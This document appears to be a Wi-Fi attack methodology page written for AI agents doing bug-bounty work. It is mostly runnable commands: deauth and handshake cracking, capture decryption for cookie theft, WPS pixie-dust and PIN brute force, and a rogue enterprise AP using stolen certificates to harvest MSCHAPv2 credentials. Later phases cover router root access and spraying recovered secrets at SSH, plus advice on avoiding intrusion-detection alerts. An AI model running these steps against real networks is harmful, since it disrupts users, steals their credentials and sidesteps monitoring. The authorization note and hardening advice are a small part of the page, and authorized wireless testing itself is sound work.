---
technology: "Wi-Fi / 802.11 attack surface"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "corpus-grounded (wireless command-context gate, internal coverage ledger) + upstream-verified: pixiewps project FAQ (pixie-dust, Dominique Bongard summer 2014, E-S1/E-S2 32-bit weak PRNG, ~11k PIN-half candidates), reaver/pixiewps/OneShot tool docs, hostapd README-WPS (ap_setup_locked=1), aircrack-ng suite docs, wpa_supplicant reference, eaphammer docs (cert-wizard, wpa-eap rogue), 2026-11-12"
provenance: "corpus-grounded: 5 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

Companion page: [[wifi|Wi-Fi attack surface overview]] — the radio + credential-reuse model. Tool notes live in the tools vault; Appendix A names tools in prose. The MSCHAPv2/NETNTLM cracking side is shared with [[pptp-bug-bounty|the CHAP-family methodology]].

# Wi-Fi bug bounty methodology

**Scope:** 802.11 reconnaissance and attacks from any position with radios or captures (foothold box, consultant workstation, handed-over pcap): monitor-mode survey, WPA-PSK handshake capture/crack/decrypt, WPS online brute and pixie dust, enterprise rogue-AP harvesting, network entry and credential reuse. **Out of scope:** wired-side post-access enumeration (generic network units), and pure MSCHAPv2/NETNTLM cracking theory (shared unit).

**Authorization:** deauthentication and rogue APs affect *users*, not just infrastructure — every real client you force off a network or credential you harvest is user-impacting. Confirm wireless testing is in scope, minimize deauth counts, prefer captures already on disk, and never join a production network without permission.

## Decision tree (one screen)

1. Radios present → Phase 1 (roles/modes/capabilities) then Phase 2 (survey).
2. Capture file already on disk → Phase 3C directly (aircrack-ng on the pcap).
3. PSK network with clients → Phase 3 (deauth → handshake → crack → decrypt).
4. WPS IE present in scan output → Phase 4 (pixie dust first, online brute second).
5. MGT/EAP network → Phase 5 (cert theft → rogue AP → MSCHAPv2 capture → crack).
6. Key in hand → Phase 6 (join, loot the network, reuse credentials).

## Phase 1 — Interface and position enumeration

```bash
iw dev                          # interfaces + type (AP/managed/monitor) per phy
iwconfig                        # legacy view: Mode, ESSID, Access Point, Tx-Power
iwlist <if> scan | grep -E 'ESSID|Channel|WPA|IE'   # quick survey without monitor mode
systemctl status hostapd wpa_supplicant   # who is AP, who is client
getcap -r / 2>/dev/null         # reaver/wash carrying cap_net_raw = the WPS path is pre-armed
```

Map roles before attacking: the AP interface (master mode / hostapd), client interfaces (managed + wpa_supplicant), and the monitor interface (`mon0`-style, or create one). A foothold inside a container may still own a wlan interface — scan from wherever the radio lives.

## Phase 2 — Survey and target selection

```bash
airmon-ng start wlan1
airodump-ng wlan1mon --band abg        # both bands; one screen: BSSID, channel, ENC, cipher, AUTH
```

Read the AUTH column as the plan: **PSK** rows → Phase 3; **MGT** rows → Phase 5; WPS-capable APs → Phase 4 (`iw <if> scan` shows the WPS IE — version, "Configured" state, config methods). Note multiple BSSIDs per ESSID (both must be handled later) and signal/channel for the capture setup. Non-wireless context loot that feeds this phase: network diagrams, SNMP descriptions with default passwords, `/etc/config/wireless` and backup archives holding SSID+PSK pairs (corpus: an OpenWrt backup tarball's wireless config gave the PSK that opened SSH before any radio work).

## Phase 3 — WPA-PSK: capture, crack, decrypt

**A. Force and capture the handshake:**

```bash
airodump-ng wlan1mon -c <ch> -w cap        # terminal 1: stay on channel, watch for 'WPA handshake:'
aireplay-ng -0 5 wlan1mon -a <AP-BSSID> -c <CLIENT-MAC>   # terminal 2: kick one client, it reconnects
```

**B. Crack offline:** `aircrack-ng cap-01.cap -w /usr/share/wordlists/rockyou.txt` — human PSKs fall to wordlists; keep capturing a minute past the handshake (traffic aids later decryption).

**C. No radio needed variant:** a `.cap` on disk (tool directories, incident exports) cracks identically — `aircrack-ng captured.cap -w <list>`; the recovered PSK's first reuse target is whatever account shares it (corpus: ESSID- and PSK-derived strings opened SSH directly).

**D. Decrypt everything:** `airdecap-ng -e <ESSID> -p <PSK> cap-01.cap` rewrites the capture in cleartext — then mine it like any pcap: `tshark -Y http.cookie -T fields -e http.cookie -r cap-dec.cap`. Corpus-proven impact: a session cookie with an embedded role claim, tampered to admin, turned a decrypted HTTP session into a webshell upload on the AP's admin panel.

## Phase 4 — WPS attacks

**A. Pixie dust (offline, seconds-to-minutes, chipset-dependent):** exploits weak E-S1/E-S2 nonce generation (32-bit-state PRNGs, no external entropy — Dominique Bongard's 2014 research; implemented by pixiewps, reaver's `-K`, OneShot). One M1–M3 exchange plus offline brute of the two PIN halves (~11,000 candidates) yields the PIN, then the PSK:

```bash
python3 oneshot.py -i wlan0 -K        # or: reaver -i mon0 -b <BSSID> -K -vv
```

**B. Online PIN brute (works where pixie dust fails):** the protocol leaks which half of the PIN is wrong — 10^4 first-half guesses, then 10^3 second-half, checksum digit computed — a space near 11,000 total guesses, not ten million:

```bash
wash -i mon0                          # confirm WPS + lock state first (needs the same caps)
reaver -i mon0 -b <AP-BSSID> -c <ch> -vv
```

Unlocked APs take the whole run; hostapd exposes `ap_setup_locked` (1 = locked) and auto-lock behavior varies by firmware — re-check `wash` after a burst.

**C. From PIN to network:** the tool prints the PSK; proceed to Phase 6. The corpus follow-through: recovered PSK reused as the root password on the AP's host (`su root`).

## Phase 5 — Enterprise (WPA-EAP / MGT)

1. **Steal the EAP server's certificates** — from the PSK-side AP or a sync script (`certs-backup` directories, `send_certs.sh`-style cron): server cert, CA cert, private key + passphrase.
2. **Stand up a rogue AP with the trusted cert:**

```bash
eaphammer --cert-wizard import --server-cert server.crt --ca-cert ca.crt \
          --private-key server.key --private-key-passwd <pw>
eaphammer -i wlan3 --auth wpa-eap --essid <target-ESSID>
```

3. **Coerce clients:** deauth continuously (`aireplay-ng -0 0`) from a second radio — with two legitimate BSSIDs for the ESSID, deauthenticate *both* simultaneously or clients stay put.
4. **Harvest and crack:** the rogue AP logs the MSCHAPv2 exchange (challenge/response) in both john NETNTLM and hashcat formats → `hashcat -m 5500 hash rockyou.txt` (cracking depth: [[pptp-bug-bounty|CHAP-family unit]] — including the DES-solve route for strong passwords).
5. **Join legitimately:** a `wpa_supplicant` config with `key_mgmt=WPA-EAP`, `eap=PEAP`, `identity=`, `password=`, `phase2="auth=MSCHAPV2"` authenticates the real network.

## Phase 6 — Network entry and aftermath

```bash
wpa_supplicant -B -i wlan0 -c wpa.conf && dhclient -v wlan0   # psk= or EAP stanza
arp -a                              # who is on this network (the .1 gateway is the router)
nmap <router-ip>                    # 22/53/80/443-class mgmt set
```

- **Router panels:** OpenWrt LuCI panels have shipped with root and *no* password — the Administration → SSH-Keys tab imports your public key for a straight root shell (corpus-proven).
- **AP loot:** `/etc/hostapd/hostapd_wpe.eap_user`-class files hold per-user credentials in cleartext; `login.php`-style panels hold hard-coded pairs.
- **Credential reuse loop:** every wireless secret (PSK, MSCHAPv2 password, hostapd file entries) goes into the SSH/su spray list — this is the unit's payoff step.

## Phase 7 — Defense and validation notes

- **Finding shape:** survey output (BSSIDs/modes), the attack artifact (handshake line, WPS PIN recovery log, rogue-AP MSCHAPv2 capture), the cracked secret, and the reuse proof (one authenticated login).
- **Defender telemetry to note and avoid:** deauth bursts (WIDS rules fire fast), unknown BSSIDs with a trusted-org ESSID, WPS authentication floods, clients roaming to channel-changed clones.
- **Hardening for the report:** disable WPS entirely (pixie dust and online brute both die); long random PSKs or certificate-based EAP with validated server certs (no cert validation = rogue-AP food — that is the finding to lead with); lock or rate-limit AP management; never reuse wireless secrets on infrastructure accounts.

## Appendix A — Tooling (named in prose)

- **iw / iwconfig / iwlist** — interface roles, scan, link state (no monitor mode needed).
- **aircrack-ng suite** — airmon-ng (monitor mode), airodump-ng (survey/capture), aireplay-ng (deauth), aircrack-ng (crack), airdecap-ng (decrypt).
- **reaver / wash** — online WPS PIN brute and WPS survey; reaver `-K` carries pixie dust.
- **pixiewps / OneShot** — offline pixie-dust implementations (Bongard's attack).
- **eaphammer** — rogue-AP with imported certificates; cert-wizard for the import.
- **wpa_supplicant / dhclient** — joining PSK and EAP networks; configs double as evidence of the org's auth shape.
- **tshark** — cookie/secret mining from decrypted captures.
- **hashcat** — mode 5500 (NETNTLM/MSCHAPv2) and PSK wordlist cracking.
- References (upstream-verified for this page): pixiewps FAQ; reaver/OneShot docs; hostapd README-WPS; aircrack-ng and eaphammer documentation.

## Appendix B — Quick reference

```bash
airmon-ng start wlan1 && airodump-ng wlan1mon --band abg
aireplay-ng -0 5 wlan1mon -a <AP-BSSID> -c <CLIENT-MAC>      # handshake
aircrack-ng cap-01.cap -w /usr/share/wordlists/rockyou.txt
airdecap-ng -e <ESSID> -p <PSK> cap-01.cap
python3 oneshot.py -i wlan0 -K                              # pixie dust
reaver -i mon0 -b <AP-BSSID> -c <ch> -vv                    # online PIN
hashcat -m 5500 hash /usr/share/wordlists/rockyou.txt       # MSCHAPv2 from rogue AP
wpa_supplicant -B -i wlan0 -c wpa.conf && dhclient wlan0
```
